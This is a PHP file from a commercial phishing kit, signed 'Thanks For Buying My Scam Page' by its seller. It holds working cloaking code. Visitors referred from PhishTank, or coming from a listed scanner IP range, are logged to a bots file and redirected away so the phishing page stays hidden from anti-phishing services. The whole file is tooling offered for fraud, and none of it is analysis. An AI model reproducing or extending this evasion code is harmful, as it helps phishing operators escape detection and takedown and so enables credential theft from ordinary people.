<?php

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  @ElZero
telegram => @ElZeroCoder
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/

// Anti Bot From phishtank

if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com' ) {
 	$content = "El Zero AntiBots => ".$_SERVER['HTTP_REFERER']." [ phishtank ] \r\n";
    $save=fopen("priv/bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
	header("Location: ".redirectBot());exit();
	}
}
if(isset($_SERVER['HTTP_REFERER'])) {
 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
 	$content = "El Zero AntiBots => ".$_SERVER['HTTP_REFERER']." [ phishtank ] \r\n";
    $save=fopen("priv/bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
	header("Location: ".redirectBot());exit();
	}
}
$range_start = ip2long("146.112.0.0");
$range_end   = ip2long("146.112.255.255");
$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

 if ($ip2long >= $range_start && $ip2long <= $range_end){
 	$content = "El Zero AntiBots => ".$_SERVER['HTTP_USER_AGENT']." [ phishtank ] \r\n";
    $save=fopen("priv/bots.txt","a+");
    fwrite($save,$content);
    fclose($save);
 	header("Location: ".redirectBot());exit();

 }
// https://safebrowsing.google.com/safebrowsing/report_phish/?hl=en
?>